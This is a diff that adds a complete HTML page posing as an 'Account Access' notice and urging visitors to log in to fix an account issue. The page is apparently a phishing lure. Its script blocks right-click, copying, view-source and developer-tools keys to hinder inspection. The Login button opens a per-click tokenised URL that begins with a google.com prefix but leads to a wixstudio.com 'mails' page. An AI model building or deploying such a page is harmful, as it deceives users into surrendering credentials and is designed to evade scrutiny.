@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+	<title>Account Access</title>
+	<style type="text/css">html, body {
+    height: 100%;
+    margin: 0;
+    font-family: Arial, sans-serif;
+    user-select: none; /* Disable text selection */
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #f9f9f9;
+  }
+  .container {
+    text-align: center;
+  }
+  .logo {
+    display: block;
+    margin: 0 auto 20px auto;
+    max-width: 150px;
+    height: auto;
+  }
+  h1 {
+    margin: 0 0 10px 0;
+    font-size: 2.5rem;
+    color: #333;
+  }
+  p {
+    margin: 0 0 30px 0;
+    font-size: 1.2rem;
+    color: #555;
+  }
+  button {
+    background-color: #007bff; /* Blue */
+    color: white;
+    border: none;
+    padding: 18px 50px;
+    font-size: 1.5rem;
+    border-radius: 8px;
+    cursor: pointer;
+    user-select: none; /* Prevent copying button text */
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #0056b3;
+  }
+	</style>
+</head>
+<body oncontextmenu="return false;">
+<div class="container"><img alt="Logo" class="logo" src="https://i.ibb.co/cSY1zPsS/logo-small.png" />
+<h1>Welcome</h1>
+
+<p>Please kindly log in to fix your account issue:</p>
+<button id="loginBtn">Login</button></div>
+<script>
+  // Disable keyboard shortcuts for copy, cut, paste, view source, dev tools
+  document.addEventListener('keydown', function(e) {
+    if (
+      (e.ctrlKey && (e.key === 'c' || e.key === 'x' || e.key === 'v' || e.key === 'u' || e.key === 'U' || e.key === 'j' || e.key === 'J')) ||
+      e.key === 'F12'
+    ) {
+      e.preventDefault();
+      alert("Sorry, this action is disabled.");
+    }
+  });
+
+  // Button click handler
+  document.getElementById('loginBtn').addEventListener('click', function() {
+    // Your base domain and original link
+    const baseDomain = "https://google.com/page#";
+    const originalLink = "mad.wixstudio.com/mails";
+
+    // Generate a unique token (simple example: timestamp + random string)
+    const uniqueToken = Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+
+    // Construct the unique URL
+    const uniqueURL = baseDomain + uniqueToken + "." + originalLink;
+
+    // Open the unique URL in a new tab
+    window.open(uniqueURL, '_blank');
+  });
+</script></body>
+</html>
